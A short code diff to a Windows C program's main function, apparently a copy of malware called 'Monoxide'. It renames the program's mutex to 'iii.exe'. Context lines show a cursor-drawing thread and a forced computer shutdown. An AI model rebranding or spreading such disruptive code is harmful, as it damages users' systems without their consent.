@@ -72,7 +72,7 @@ wWinMain(
 
 	hCursorDraw = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)CursorDraw, NULL, 0, NULL);
 
-	CreateMutexW(NULL, TRUE, L"Monoxide.exe");
+	CreateMutexW(NULL, TRUE, L"iii.exe");
 
 	if (GetLastError() == ERROR_ALREADY_EXISTS)
 	{
@@ -148,4 +148,5 @@ wWinMain(
 	{
 		ForceShutdownComputer();
 	}
+
 }
